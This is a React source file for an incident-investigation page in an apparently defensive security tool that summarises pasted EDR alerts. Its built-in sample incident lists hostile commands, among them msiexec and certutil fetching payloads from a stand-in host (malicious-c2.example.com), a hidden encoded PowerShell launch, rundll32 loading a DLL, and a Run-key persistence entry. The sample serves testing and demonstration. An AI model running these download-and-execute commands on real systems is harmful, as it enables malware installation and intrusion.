/**
 * AutoInvestigatePage — Sprint 1 MVP flagship page.
 *
 * Analyst pastes a full incident from any source (CrowdStrike, Defender,
 * SentinelOne, Splunk, Sysmon …), presses AUTO INVESTIGATE, and gets a
 * structured FINAL INCIDENT SUMMARY back — no prompt engineering, no
 * per-command decoding step.
 *
 * All heavy lifting happens in POST /api/v2/auto-investigate (deterministic
 * orchestrator over the existing engine). This component is the shell.
 */
import { useCallback, useState } from "react";
import api, { API_BASE } from "@/lib/api";
import Header from "@/components/Header";

const SEVERITY_TONE = {
  Critical:      { bg: "#450a0a", fg: "#fecaca", border: "#7f1d1d" },
  High:          { bg: "#451a03", fg: "#fed7aa", border: "#7c2d12" },
  Medium:        { bg: "#422006", fg: "#fde68a", border: "#78350f" },
  Low:           { bg: "#083344", fg: "#a5f3fc", border: "#164e63" },
  Informational: { bg: "#052e16", fg: "#bbf7d0", border: "#14532d" },
};

const VERDICT_TONE = {
  malicious:    "text-red-300 border-red-500/40 bg-red-500/10",
  critical:     "text-red-200 border-red-500/60 bg-red-500/15",
  suspicious:   "text-amber-300 border-amber-500/40 bg-amber-500/10",
  needs_review: "text-sky-300 border-sky-500/40 bg-sky-500/10",
  benign:       "text-emerald-300 border-emerald-500/40 bg-emerald-500/10",
  unknown:      "text-slate-300 border-slate-500/40 bg-slate-500/10",
};

const SAMPLE_INCIDENT = `CrowdStrike Falcon Alert · High · Host: FIN-DC-01 · User: backup_EA
Detection time: 2026-07-22T13:04:54Z

Process tree:
  msiexec.exe /i http://malicious-c2.example.com/loader.msi
   └─ powershell.exe -NoP -W Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=
   └─ certutil -urlcache -f http://malicious-c2.example.com/loader.exe C:\\Users\\backup_EA\\AppData\\Local\\loader.exe
   └─ cmd.exe /c whoami && net user backup_EA /domain
   └─ rundll32.exe C:\\Windows\\Temp\\evil.dll,DllMain

C2 IP: 192.168.44.101
Domain: malicious-c2.example.com
SHA256: 4a67e9c22b0c5d7f8ab1c3d0e5b8a2f7d6c8e4a1b9d2f0e3c7a8b5d4e6f1a2c9
Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\backup_EA`;

export default function AutoInvestigatePage() {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState(null);
  const [focus, setFocus] = useState("");

  const runInvestigation = useCallback(async () => {
    if (!input.trim()) return;
    setLoading(true);
    setError("");
    setResult(null);
    try {
      const r = await api.post("/v2/auto-investigate", {
        incident_text: input, focus: focus || null,
      });
      setResult(r.data);
    } catch (e) {
      setError(e.friendlyMessage || e.response?.data?.detail || String(e.message || e));
    } finally {
      setLoading(false);
    }
  }, [input, focus]);

  const downloadMarkdown = () => {
    if (!result) return;
    const md = renderMarkdown(result);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.md";
    a.click();
    URL.revokeObjectURL(url);
  };

  const downloadJson = () => {
    if (!result) return;
    const blob = new Blob([JSON.stringify(result, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.json";
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      <Header />
      <div className="px-6 py-8">
        <div className="max-w-6xl mx-auto space-y-6">
          <header className="flex items-baseline justify-between" data-testid="auto-investigate-header">
            <div>
              <h1 className="text-2xl font-bold tracking-tight">
                <span className="text-cyan-400">⚡</span> AUTO INVESTIGATE
                <span className="text-slate-500 text-lg font-normal ml-2">v1 · Deterministic First</span>
              </h1>
              <p className="text-sm text-slate-400 mt-1">
                Paste an entire incident. NivXRay extracts, decodes, correlates, and produces a Final Incident Summary — no prompt engineering.
              </p>
            </div>
          </header>

          {/* Input card */}
          <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-5"
                   data-testid="auto-investigate-input-card">
            <div className="flex items-center justify-between mb-3">
              <h2 className="text-base font-semibold">Incident input</h2>
              <div className="flex items-center gap-2 text-xs">
                <span className="text-slate-500">Sources:</span>
                <span className="text-slate-400">CrowdStrike · Defender · SentinelOne · Splunk · Sysmon · Cisco · Any text</span>
              </div>
            </div>
            <textarea
              className="w-full min-h-[220px] bg-slate-950/60 border border-slate-800 rounded-lg p-3 font-mono text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-1 focus:ring-cyan-500"
              placeholder="Paste the raw incident here — alert JSON, EDR narrative, plain text, Sysmon logs…"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              disabled={loading}
              data-testid="auto-investigate-input"
            />
            <div className="mt-3 flex items-center gap-2 flex-wrap">
              <button
                onClick={runInvestigation}
                disabled={loading || !input.trim()}
                data-testid="auto-investigate-run-btn"
                className="px-4 py-2 text-sm rounded-lg bg-cyan-500/90 hover:bg-cyan-500 disabled:bg-slate-700 disabled:text-slate-500 text-slate-950 font-bold"
              >
                {loading ? "Investigating…" : "⚡ AUTO INVESTIGATE"}
              </button>
              <button
                onClick={() => setInput(SAMPLE_INCIDENT)}
                disabled={loading}
                data-testid="auto-investigate-sample-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-300 hover:bg-slate-800/60"
              >
                Load sample incident
              </button>
              <button
                onClick={() => { setInput(""); setResult(null); setError(""); }}
                disabled={loading}
                data-testid="auto-investigate-clear-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-400 hover:bg-slate-800/60"
              >
                Clear
              </button>
              <div className="flex items-center gap-1.5 text-xs ml-auto">
                <span className="text-slate-500">Focus:</span>
                {["", "persistence", "c2", "credential-access", "powershell"].map(f => (
                  <button key={f || "any"}
                          data-testid={`focus-${f || "any"}`}
                          onClick={() => setFocus(f)}
                          className={`px-2 py-1 rounded-full text-[10px] font-mono border ${
                            focus === f ? "bg-cyan-500/20 border-cyan-500/60 text-cyan-200"
                                        : "border-slate-700 text-slate-400 hover:bg-slate-800/50"
                          }`}>
                    {f || "any"}
                  </button>
                ))}
              </div>
            </div>
            {error && (
              <div className="mt-3 text-sm text-red-400" data-testid="auto-investigate-error">{error}</div>
            )}
          </section>

          {loading && (
            <div className="animate-pulse space-y-3">
              <div className="h-24 bg-slate-800/40 rounded-xl" />
              <div className="h-40 bg-slate-800/40 rounded-xl" />
              <div className="h-32 bg-slate-800/40 rounded-xl" />
            </div>
          )}

          {result && <FinalIncidentSummary result={result} onExportMd={downloadMarkdown} onExportJson={downloadJson} />}
        </div>
      </div>
    </div>
  );
}

// ─── FINAL INCIDENT SUMMARY panel ────────────────────────────────
function FinalIncidentSummary({ result, onExportMd, onExportJson }) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const sevTone = SEVERITY_TONE[fis.severity] || SEVERITY_TONE.Low;
  const verdictTone = VERDICT_TONE[fis.verdict] || VERDICT_TONE.unknown;
  return (
    <section className="space-y-5" data-testid="final-incident-summary">
      {/* Verdict + severity + confidence header */}
      <div className="flex flex-wrap items-center gap-3 border border-slate-700/60 bg-slate-900/40 rounded-xl p-4">
        <span className="text-[10px] tracking-[0.24em] font-bold text-slate-500">FINAL INCIDENT SUMMARY</span>
        <span className={`px-3 py-1 rounded-full text-xs font-bold uppercase border ${verdictTone}`}
              data-testid="fis-verdict">{fis.verdict}</span>
        <span className="px-3 py-1 rounded-full text-xs font-bold border"
              data-testid="fis-severity"
              style={{ background: sevTone.bg, color: sevTone.fg, borderColor: sevTone.border }}>
          {fis.severity}
        </span>
        <span className="px-3 py-1 rounded-full text-xs border border-slate-700 text-slate-300"
              data-testid="fis-confidence">
          Confidence {fis.confidence?.score ?? 0}%
        </span>
        <span className="text-xs text-slate-400 truncate max-w-[40ch]" title={fis.classification}
              data-testid="fis-classification">
          · {fis.classification}
        </span>
        <div className="ml-auto flex items-center gap-2">
          <button onClick={onExportMd} data-testid="fis-export-md"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · Markdown
          </button>
          <button onClick={onExportJson} data-testid="fis-export-json"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · JSON
          </button>
        </div>
      </div>

      <Section title="Executive Summary" testid="fis-executive">
        <div className="space-y-2 text-sm text-slate-200 leading-relaxed">
          {(fis.executive_summary || []).map((p, i) => (
            <p key={i} dangerouslySetInnerHTML={{ __html: markdownInline(p) }} />
          ))}
        </div>
      </Section>

      {/* Detected · commands + entities */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="Detected commands" testid="fis-commands">
          {(det.commands || []).length === 0
            ? <Empty text="No command binaries detected in the incident." />
            : <ul className="space-y-2 text-xs font-mono" data-testid="fis-commands-list">
                {det.commands.map((c, i) => (
                  <li key={i} className="border border-slate-800 rounded p-2 bg-slate-950/60">
                    <div className="text-cyan-300 font-bold">{c.binary}</div>
                    <div className="text-slate-300 break-all">{c.command_line}</div>
                  </li>
                ))}
              </ul>}
        </Section>
        <Section title="Extracted entities" testid="fis-entities">
          <EntityGrid entities={det.entities || {}} />
        </Section>
      </div>

      {/* Findings */}
      <Section title="Investigation Findings" testid="fis-findings">
        {(fis.findings || []).length === 0
          ? <Empty text="No per-command findings produced." />
          : <table className="w-full text-sm">
              <thead className="text-slate-400 text-left border-b border-slate-800">
                <tr><th className="py-2">Command</th><th className="py-2">Verdict</th><th className="py-2 text-right">Risk</th><th className="py-2">Why</th></tr>
              </thead>
              <tbody>
                {fis.findings.map((f, i) => (
                  <tr key={i} className="border-b border-slate-900 align-top">
                    <td className="py-2 font-mono text-slate-200 max-w-[24ch] truncate" title={f.command_line}>
                      <span className="text-cyan-300 mr-1">{f.binary}</span>
                      {f.command_line?.slice(f.binary.length).slice(0, 30)}…
                    </td>
                    <td className="py-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] uppercase border ${VERDICT_TONE[f.verdict] || VERDICT_TONE.unknown}`}>
                        {f.verdict}
                      </span>
                    </td>
                    <td className="py-2 text-right font-mono text-slate-300">{f.risk_score ?? "—"}</td>
                    <td className="py-2 text-slate-400 text-xs">{f.why}</td>
                  </tr>
                ))}
              </tbody>
            </table>}
      </Section>

      {/* MITRE + IOC */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="MITRE ATT&CK" testid="fis-mitre">
          {(fis.mitre_attack || []).length === 0
            ? <Empty text="No MITRE techniques mapped." />
            : <table className="w-full text-xs">
                <thead className="text-slate-500 text-left border-b border-slate-800">
                  <tr><th className="py-1">ID</th><th className="py-1">Technique</th><th className="py-1">Tactic</th></tr>
                </thead>
                <tbody>
                  {fis.mitre_attack.map(m => (
                    <tr key={m.id} className="border-b border-slate-900">
                      <td className="py-1 font-mono text-cyan-300">
                        <a href={`https://attack.mitre.org/techniques/${m.id.split(".")[0]}/${m.id.includes(".") ? m.id.split(".")[1] + "/" : ""}`}
                           target="_blank" rel="noreferrer" className="hover:underline">{m.id}</a>
                      </td>
                      <td className="py-1 text-slate-200">{m.technique}</td>
                      <td className="py-1 text-slate-400">{m.tactic}</td>
                    </tr>
                  ))}
                </tbody>
              </table>}
        </Section>

        <Section title="IOC Summary" testid="fis-iocs">
          <EntityGrid entities={fis.iocs || {}} />
        </Section>
      </div>

      {/* Recommendations */}
      <Section title="Recommendations" testid="fis-recommendations">
        <ol className="space-y-2 text-sm">
          {(fis.recommendations || []).map((r, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="flex items-baseline gap-2">
                <span className={`text-[10px] uppercase tracking-wide px-2 py-0.5 rounded-full border ${
                  r.priority === "critical" ? "border-red-500/60 text-red-300" :
                  r.priority === "high"     ? "border-amber-500/60 text-amber-300" :
                                              "border-sky-500/60 text-sky-300"
                }`}>{r.priority}</span>
                <span className="text-slate-100 font-medium">{r.action}</span>
              </div>
              {r.rationale && <div className="text-xs text-slate-400 mt-1">{r.rationale}</div>}
            </li>
          ))}
        </ol>
      </Section>

      {/* Evidence counts */}
      <Section title="Evidence counts" testid="fis-evidence-counts">
        <div className="grid grid-cols-3 sm:grid-cols-6 gap-3 text-xs">
          {Object.entries(fis.evidence_counts || {}).map(([k, v]) => (
            <div key={k} className="border border-slate-800 rounded p-2 bg-slate-950/60 text-center">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide">{k}</div>
              <div className="text-lg font-bold text-slate-100 font-mono">{v}</div>
            </div>
          ))}
        </div>
      </Section>

      {/* Investigation Quality Dashboard — deterministic scorecard */}
      {fis.investigation_quality && (
        <QualityDashboard q={fis.investigation_quality} />
      )}
    </section>
  );
}

// ─── Investigation Quality Dashboard ────────────────────────────
function QualityDashboard({ q }) {
  const completeness = q.overall?.investigation_completeness ?? 0;
  const ready        = !!q.overall?.ready_for_analyst_review;
  return (
    <section className="border rounded-xl p-5"
             data-testid="fis-quality"
             style={{
               background: "linear-gradient(135deg, #0a1628 0%, #051020 100%)",
               borderColor: ready ? "rgba(52,211,153,0.35)" : "rgba(245,158,11,0.35)",
             }}>
      <div className="flex items-center justify-between mb-4">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-slate-400">
            INVESTIGATION QUALITY
          </div>
          <div className="text-lg font-bold mt-1"
               style={{ color: ready ? "#4ADE80" : "#F59E0B" }}
               data-testid="quality-headline">
            Overall Completeness · {completeness}%
          </div>
        </div>
        <div className="text-right">
          <span className={`px-3 py-1 rounded-full text-xs font-bold border ${
            ready ? "text-emerald-300 border-emerald-500/50 bg-emerald-500/10"
                  : "text-amber-300 border-amber-500/50 bg-amber-500/10"
          }`} data-testid="quality-ready">
            {ready ? "READY FOR ANALYST REVIEW" : "REVIEW GAPS BELOW"}
          </span>
        </div>
      </div>

      {/* Completeness bar */}
      <div className="mb-5">
        <div className="h-2 rounded-full overflow-hidden bg-slate-800/60">
          <div className="h-full rounded-full transition-all"
               style={{
                 width: `${completeness}%`,
                 background: ready
                   ? "linear-gradient(90deg,#10B981,#4ADE80)"
                   : "linear-gradient(90deg,#F59E0B,#FCD34D)",
               }} />
        </div>
        <div className="mt-1 flex justify-between text-[9px] font-mono text-slate-500">
          {Object.entries(q.overall?.axes || {}).map(([k, v]) => (
            <span key={k} title={`${k}: ${v}%`}>{k} {v}%</span>
          ))}
        </div>
      </div>

      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
        <FlagGroup title="Evidence Processing" data={q.evidence_processing} />
        <KVGroup   title="Command Analysis"   data={q.command_analysis} highlight={{ decode_ratio: true, failed_decodes: true }} />
        <KVGroup   title="Coverage"           data={q.coverage} />
        <NumberGroup title="Confidence"       data={q.confidence} />
        <FlagGroup title="Validation"         data={q.validation} />
      </div>
    </section>
  );
}

function FlagGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-flag-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-bold text-[10px] px-2 py-0.5 rounded ${
              v ? "text-emerald-300 bg-emerald-500/10 border border-emerald-500/40"
                : "text-red-300 bg-red-500/10 border border-red-500/40"
            }`}>
              {v ? "PASS" : "FAIL"}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function KVGroup({ title, data, highlight = {} }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-kv-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-mono font-bold text-[11px] ${
              highlight[k] && String(v).includes("/") ? "text-cyan-300"
                : highlight[k] && v > 0                ? "text-amber-300"
                : "text-slate-100"
            }`}>{String(v)}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function NumberGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-2">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k} data-testid={`quality-conf-${k}`}>
            <div className="flex justify-between text-[11px]">
              <span className="text-slate-300 font-mono">{k.replace(/_/g, " ")}</span>
              <span className="font-mono font-bold text-slate-100">{v}%</span>
            </div>
            <div className="h-1 mt-1 rounded-full bg-slate-800/60 overflow-hidden">
              <div className="h-full rounded-full"
                   style={{
                     width: `${v}%`,
                     background: v >= 80 ? "#10B981"
                                : v >= 50 ? "#F59E0B"
                                :           "#EF4444",
                   }} />
            </div>
          </li>
        ))}
      </ul>
    </div>
  );
}

function Section({ title, testid, children }) {
  return (
    <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-4"
             data-testid={testid}>
      <h3 className="text-xs uppercase tracking-widest text-slate-400 font-bold mb-3">{title}</h3>
      {children}
    </section>
  );
}

function Empty({ text }) {
  return <div className="text-xs text-slate-500 italic">{text}</div>;
}

function EntityGrid({ entities }) {
  const buckets = Object.entries(entities).filter(([, v]) => Array.isArray(v) && v.length > 0);
  if (buckets.length === 0) return <Empty text="No indicators of compromise extracted." />;
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
      {buckets.map(([label, values]) => (
        <div key={label} className="border border-slate-800 rounded p-2 bg-slate-950/60">
          <div className="text-[10px] text-slate-500 uppercase tracking-wide mb-1">
            {label} ({values.length})
          </div>
          <ul className="text-xs font-mono text-slate-200 space-y-0.5 break-all">
            {values.slice(0, 6).map((v, i) => <li key={i}>{v}</li>)}
            {values.length > 6 && <li className="text-slate-500">…{values.length - 6} more</li>}
          </ul>
        </div>
      ))}
    </div>
  );
}

// ─── Markdown export ─────────────────────────────────────────────
function renderMarkdown(result) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const lines = [];
  lines.push(`# NivXRay · Final Incident Summary`);
  lines.push("");
  lines.push(`- **Verdict:** ${fis.verdict}`);
  lines.push(`- **Severity:** ${fis.severity}`);
  lines.push(`- **Classification:** ${fis.classification}`);
  lines.push(`- **Confidence:** ${fis.confidence?.score ?? 0}% — ${fis.confidence?.reason ?? ""}`);
  lines.push("");
  lines.push("## Executive Summary");
  (fis.executive_summary || []).forEach(p => { lines.push(p); lines.push(""); });
  lines.push("## Detected commands");
  (det.commands || []).forEach(c => lines.push(`- \`${c.binary}\` — ${c.command_line}`));
  lines.push("");
  lines.push("## MITRE ATT&CK");
  (fis.mitre_attack || []).forEach(m => lines.push(`- **${m.id}** · ${m.technique} · ${m.tactic}`));
  lines.push("");
  lines.push("## IOCs");
  Object.entries(fis.iocs || {}).forEach(([k, v]) => {
    if (Array.isArray(v) && v.length) lines.push(`- **${k}**: ${v.join(", ")}`);
  });
  lines.push("");
  lines.push("## Recommendations");
  (fis.recommendations || []).forEach(r => lines.push(`- **[${r.priority}]** ${r.action} — ${r.rationale}`));
  lines.push("");
  lines.push("---");
  lines.push("*Deterministic report — every conclusion is evidence-linked. Original incident text is preserved verbatim in the JSON export.*");
  return lines.join("\n");
}

function markdownInline(s) {
  // Very small subset: **bold** and `code`.
  return String(s || "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/\*\*(.+?)\*\*/g, '<b class="text-slate-100">$1</b>')
    .replace(/`([^`]+)`/g, '<code class="font-mono text-cyan-300">$1</code>');
}
